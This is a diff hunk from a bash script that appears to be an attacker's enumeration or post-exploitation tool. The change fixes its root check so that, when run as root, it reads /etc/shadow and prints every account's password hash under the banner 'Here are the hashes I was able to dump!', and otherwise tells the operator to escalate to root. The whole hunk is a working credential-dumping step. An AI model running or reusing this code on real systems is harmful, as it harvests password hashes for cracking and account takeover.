@@ -61,12 +61,14 @@ echo " "
 
 echo -e $yellow"========================================================================================================================================================================================================"$RESET
 #Check to see if root. If you are root then dump hashes. 
-CheckIfRoot="id -u"
 Shadow="cat /etc/shadow | cut -d ':' -f1-2 | grep -v '*' | grep -v '!'"
-if [[ "$CheckIfRoot" -eq 0 ]]; 
+
+if [[ $EUID -eq 0 ]];
 then echo -e $orange"Here are the hashes I was able to dump!\n" $RESET; eval $Shadow
-else 
-echo -e $red"Please escalate to Root to get hashes\n" $RESET
+fi
+
+if [[ $EUID -ne 0 ]];
+then echo -e $red"Please escalate to Root to get hashes\n" $RESET
 fi
 
 echo -e $yellow"========================================================================================================================================================================================================"$RESET
